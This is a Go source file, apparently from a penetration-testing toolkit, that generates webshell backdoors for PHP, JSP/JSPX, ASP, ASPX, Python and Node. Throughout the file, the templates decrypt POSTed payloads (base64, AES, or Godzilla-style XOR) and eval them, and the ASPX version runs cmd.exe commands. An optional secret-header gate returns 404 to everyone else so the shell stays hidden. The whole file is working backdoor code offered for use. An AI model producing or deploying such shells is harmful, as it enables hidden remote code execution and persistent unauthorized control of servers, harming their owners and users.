package webshell

// generators.go — webshell 服务端模板（移植自 AI-PENTEST webshell/generators.go）。
// 客户端发 encrypt(payload_code, password) → POST；服务端解密后 eval。
// 支持矩阵：php/jsp/jspx/py/node 全三种加密；asp/aspx 仅 raw（缺原生 AES/XOR，
// aspx 因 C# 无 eval 只做 cmd-only）。

import (
	"fmt"
	"strings"
)

const passwordMark = "{{PASSWORD}}"

// ---------- PHP ----------

const phpRawShell = `<?php
@error_reporting(0);
$p = base64_decode(file_get_contents('php://input'));
if ($p === false) exit('decode failed');
eval($p);
`

const phpAesShell = `<?php
@error_reporting(0);
$k = substr(md5('{{PASSWORD}}'), 0, 16);
$d = base64_decode(file_get_contents('php://input'));
if ($d === false) exit('b64 failed');
$p = openssl_decrypt($d, 'AES-128-CBC', $k, OPENSSL_RAW_DATA, $k);
if ($p === false) exit('decrypt failed');
eval($p);
`

const phpXorShell = `<?php
@error_reporting(0);
$k = substr(md5('{{PASSWORD}}godzilla'), 0, 16);
$d = file_get_contents('php://input');
$b = base64_decode($d);
for ($i = 0; $i < strlen($b); $i++) $b[$i] = $b[$i] ^ $k[$i % 16];
eval($b);
`

// ---------- JSP（Nashorn JS 引擎） ----------

const jspRawShell = `<%@ page import="java.util.*,javax.script.*" %>
<%
byte[] body = request.getInputStream().readAllBytes();
byte[] dec = Base64.getDecoder().decode(new String(body));
ScriptEngine se = new ScriptEngineManager().getEngineByName("javascript");
try { se.getContext().setWriter(new java.io.PrintWriter(out)); se.getContext().setErrorWriter(new java.io.PrintWriter(out)); se.put("request", request); se.put("response", response); se.put("session", session); se.put("application", application); se.put("out", out); se.put("pageContext", pageContext); } catch (Exception ignore) {}
se.eval(new String(dec, "UTF-8"));
%>`

const jspAesShell = `<%@ page import="javax.crypto.*,javax.crypto.spec.*,java.security.*,java.util.*,javax.script.*" %>
<%!
String MD5(String s) throws Exception {
    MessageDigest m = MessageDigest.getInstance("MD5");
    byte[] b = m.digest(s.getBytes("UTF-8"));
    StringBuilder sb = new StringBuilder();
    for (byte x : b) sb.append(String.format("%02x", x));
    return sb.toString().substring(0, 16);
}
%>
<%
String k = MD5("{{PASSWORD}}");
byte[] body = request.getInputStream().readAllBytes();
byte[] enc = Base64.getDecoder().decode(new String(body));
SecretKeySpec key = new SecretKeySpec(k.getBytes("UTF-8"), "AES");
IvParameterSpec iv = new IvParameterSpec(k.getBytes("UTF-8"));
Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
c.init(Cipher.DECRYPT_MODE, key, iv);
byte[] p = c.doFinal(enc);
ScriptEngine se = new ScriptEngineManager().getEngineByName("javascript");
try { se.getContext().setWriter(new java.io.PrintWriter(out)); se.getContext().setErrorWriter(new java.io.PrintWriter(out)); se.put("request", request); se.put("response", response); se.put("session", session); se.put("application", application); se.put("out", out); se.put("pageContext", pageContext); } catch (Exception ignore) {}
se.eval(new String(p, "UTF-8"));
%>`

const jspXorShell = `<%@ page import="java.security.*,java.util.*,javax.script.*" %>
<%!
String MD5(String s) throws Exception {
    MessageDigest m = MessageDigest.getInstance("MD5");
    byte[] b = m.digest(s.getBytes("UTF-8"));
    StringBuilder sb = new StringBuilder();
    for (byte x : b) sb.append(String.format("%02x", x));
    return sb.toString().substring(0, 16);
}
%>
<%
String k = MD5("{{PASSWORD}}godzilla");
byte[] body = request.getInputStream().readAllBytes();
byte[] enc = Base64.getDecoder().decode(new String(body));
byte[] p = new byte[enc.length];
byte[] kb = k.getBytes("UTF-8");
for (int i = 0; i < enc.length; i++) p[i] = (byte)(enc[i] ^ kb[i % 16]);
ScriptEngine se = new ScriptEngineManager().getEngineByName("javascript");
try { se.getContext().setWriter(new java.io.PrintWriter(out)); se.getContext().setErrorWriter(new java.io.PrintWriter(out)); se.put("request", request); se.put("response", response); se.put("session", session); se.put("application", application); se.put("out", out); se.put("pageContext", pageContext); } catch (Exception ignore) {}
se.eval(new String(p, "UTF-8"));
%>`

func jspxWrap(body string) string {
	return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\">\n" + body + "\n</jsp:root>\n"
}

// ---------- ASP（VBScript，仅 raw） ----------

const aspRawShell = `<%
Option Explicit
Dim body, code
body = Request.BinaryRead(Request.TotalBytes)
code = BytesToStr(Base64DecodeBytes(body))
ExecuteGlobal code
%>
<%
Function Base64DecodeBytes(b)
    Dim xml, node
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    Dim i, s
    s = ""
    For i = 1 To LenB(b)
        s = s & Chr(AscB(MidB(b, i, 1)))
    Next
    node.text = s
    Base64DecodeBytes = node.nodeTypedValue
End Function
Function BytesToStr(b)
    Dim o
    Set o = CreateObject("ADODB.Stream")
    o.Type = 1: o.Open: o.Write b: o.Position = 0
    o.Type = 2: o.Charset = "utf-8"
    BytesToStr = o.ReadText()
End Function
%>`

// ---------- ASPX（C#，cmd-only，仅 raw） ----------

const aspxRawShell = `<%@ Page Language="C#" %>
<%
string body;
using (var sr = new System.IO.StreamReader(Request.InputStream))
    body = sr.ReadToEnd();
byte[] dec = Convert.FromBase64String(body);
string cmd = System.Text.Encoding.UTF8.GetString(dec);
var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
psi.UseShellExecute = false;
psi.RedirectStandardOutput = true;
psi.RedirectStandardError = true;
var p = System.Diagnostics.Process.Start(psi);
string out1 = p.StandardOutput.ReadToEnd();
string err = p.StandardError.ReadToEnd();
p.WaitForExit();
Response.Write(out1);
if (!string.IsNullOrEmpty(err)) Response.Write("\n[STDERR]\n" + err);
%>`

// ---------- Python（WSGI 兼容） ----------

const pyRawShell = `#!/usr/bin/env python3
# Python webshell (raw mode)
import base64

def handle_request(get_input_stream, response_writer=None):
    body = get_input_stream().read()
    code = base64.b64decode(body).decode('utf-8')
    g = {'__builtins__': __builtins__}
    exec(code, g)
    if response_writer and 'OUTPUT' in g:
        response_writer(g['OUTPUT'])

# Flask 示例：
# @app.route('/shell', methods=['POST'])
# def shell():
#     handle_request(lambda: request.stream, lambda out: Response(out, mimetype='text/plain'))
`

const pyAesShell = `#!/usr/bin/env python3
# Python webshell (AES mode) - 依赖：pip install pycryptodome
import base64, hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def handle_request(get_input_stream, response_writer=None):
    body = get_input_stream().read()
    enc = base64.b64decode(body)
    pw = '{{PASSWORD}}'
    k = hashlib.md5(pw.encode()).hexdigest()[:16].encode('ascii')
    cipher = AES.new(k, AES.MODE_CBC, iv=k)
    code = unpad(cipher.decrypt(enc), 16).decode('utf-8')
    g = {'__builtins__': __builtins__}
    exec(code, g)
    if response_writer and 'OUTPUT' in g:
        response_writer(g['OUTPUT'])
`

const pyXorShell = `#!/usr/bin/env python3
# Python webshell (XOR mode)
import base64, hashlib

def handle_request(get_input_stream, response_writer=None):
    body = get_input_stream().read()
    enc = base64.b64decode(body)
    pw = '{{PASSWORD}}godzilla'
    k = hashlib.md5(pw.encode()).hexdigest()[:16].encode('ascii')
    dec = bytes(b ^ k[i % 16] for i, b in enumerate(enc))
    code = dec.decode('utf-8')
    g = {'__builtins__': __builtins__}
    exec(code, g)
    if response_writer and 'OUTPUT' in g:
        response_writer(g['OUTPUT'])
`

// ---------- Node ----------

const nodeRawShell = `// Node.js webshell (raw mode)
const http = require('http');

function handler(req, res) {
    let chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
        const body = Buffer.concat(chunks).toString('utf-8');
        const code = Buffer.from(body, 'base64').toString('utf-8');
        try { (new Function(code))(); res.end('OK'); }
        catch (e) { res.end('ERR: ' + e.message); }
    });
}
`

const nodeAesShell = `// Node.js webshell (AES mode)
const crypto = require('crypto');

function handler(req, res) {
    let chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
        const body = Buffer.concat(chunks).toString('utf-8');
        const enc = Buffer.from(body, 'base64');
        const pw = '{{PASSWORD}}';
        const k = crypto.createHash('md5').update(pw).digest('hex').slice(0, 16);
        const d = crypto.createDecipheriv('aes-128-cbc', k, k);
        const code = Buffer.concat([d.update(enc), d.final()]).toString('utf-8');
        try { (new Function(code))(); res.end('OK'); }
        catch (e) { res.end('ERR: ' + e.message); }
    });
}
`

const nodeXorShell = `// Node.js webshell (XOR mode)
function handler(req, res) {
    let chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
        const body = Buffer.concat(chunks).toString('utf-8');
        const enc = Buffer.from(body, 'base64');
        const crypto = require('crypto');
        const pw = '{{PASSWORD}}godzilla';
        const k = crypto.createHash('md5').update(pw).digest('hex').slice(0, 16);
        const dec = Buffer.alloc(enc.length);
        for (let i = 0; i < enc.length; i++) dec[i] = enc[i] ^ k.charCodeAt(i % 16);
        const code = dec.toString('utf-8');
        try { (new Function(code))(); res.end('OK'); }
        catch (e) { res.end('ERR: ' + e.message); }
    });
}
`

// ---------- 生成入口 ----------

// FileExt 各脚本类型的默认文件扩展名。
func FileExt(scriptType string) string {
	switch scriptType {
	case "php":
		return "php"
	case "jsp":
		return "jsp"
	case "jspx":
		return "jspx"
	case "asp":
		return "asp"
	case "aspx":
		return "aspx"
	case "py":
		return "py"
	case "node":
		return "js"
	}
	return "txt"
}

// GateOpts 生成选项：Header Gate（服务端只在校验头匹配时才执行，默认 404）。
type GateOpts struct {
	Header string // 触发头名（如 X-Gate）
	Value  string // 触发头值
}

// gatePrefix 各语言的 Header Gate 前置片段（php/jsp/jspx/asp/aspx 支持；
// py/node 由外层框架管 header，忽略 gate）。
func gatePrefix(scriptType string, g GateOpts) string {
	if g.Header == "" || g.Value == "" {
		return ""
	}
	h := strings.ToUpper(g.Header)
	if strings.HasPrefix(h, "HTTP-") {
		h = strings.TrimPrefix(strings.ToUpper(strings.ReplaceAll(g.Header, "-", "_")), "HTTP_")
	} else {
		h = strings.ToUpper(strings.ReplaceAll(g.Header, "-", "_"))
	}
	switch scriptType {
	case "php":
		return "<?php\nif (!isset($_SERVER['HTTP_" + h + "']) || $_SERVER['HTTP_" + h + "'] !== '" + g.Value + "') { http_response_code(404); exit; }\n?>\n"
	case "jsp", "jspx":
		return "<%\n    String gate = request.getHeader(\"" + g.Header + "\");\n    if (gate == null || !gate.equals(\"" + g.Value + "\")) { response.sendError(404); return; }\n%>\n"
	case "asp":
		return "<%\nIf Request.ServerVariables(\"HTTP_" + h + "\") <> \"" + g.Value + "\" Then Response.End\n%>\n"
	case "aspx":
		return "<%\nif (Request.Headers[\"" + g.Header + "\"] != \"" + g.Value + "\") { Response.StatusCode = 404; Response.End; }\n%>\n"
	}
	return ""
}

// GenerateShellOpts 生成 + Header Gate。
func GenerateShellOpts(scriptType, encoder, password string, gate GateOpts) (string, error) {
	code, err := GenerateShell(scriptType, encoder, password)
	if err != nil {
		return "", err
	}
	gp := gatePrefix(scriptType, gate)
	if gp == "" {
		return code, nil
	}
	// php 的模板本身以 <?php 开头：gate 片段已是独立 php 块，直接前置
	// jsp/asp/aspx 的 gate 是独立 scriptlet，前置即可
	return gp + code, nil
}

// GenerateShell 生成服务端 shell 文件内容。不支持组合返回 error。
func GenerateShell(scriptType, encoder, password string) (string, error) {
	var tpl string
	switch scriptType {
	case "php":
		switch encoder {
		case "raw":
			tpl = phpRawShell
		case "aes":
			tpl = phpAesShell
		case "xor":
			tpl = phpXorShell
		}
	case "jsp":
		switch encoder {
		case "raw":
			tpl = jspRawShell
		case "aes":
			tpl = jspAesShell
		case "xor":
			tpl = jspXorShell
		}
	case "jspx":
		switch encoder {
		case "raw":
			tpl = jspxWrap(jspRawShell)
		case "aes":
			tpl = jspxWrap(jspAesShell)
		case "xor":
			tpl = jspxWrap(jspXorShell)
		}
	case "asp":
		if encoder == "raw" {
			tpl = aspRawShell
		}
	case "aspx":
		if encoder == "raw" {
			tpl = aspxRawShell
		}
	case "py":
		switch encoder {
		case "raw":
			tpl = pyRawShell
		case "aes":
			tpl = pyAesShell
		case "xor":
			tpl = pyXorShell
		}
	case "node":
		switch encoder {
		case "raw":
			tpl = nodeRawShell
		case "aes":
			tpl = nodeAesShell
		case "xor":
			tpl = nodeXorShell
		}
	default:
		return "", fmt.Errorf("未知脚本类型: %s（支持 php/jsp/jspx/asp/aspx/py/node）", scriptType)
	}
	if tpl == "" {
		return "", fmt.Errorf("%s 不支持 %s 加密（缺原生支持），请选 raw 模式", scriptType, encoder)
	}
	return strings.ReplaceAll(tpl, passwordMark, password), nil
}
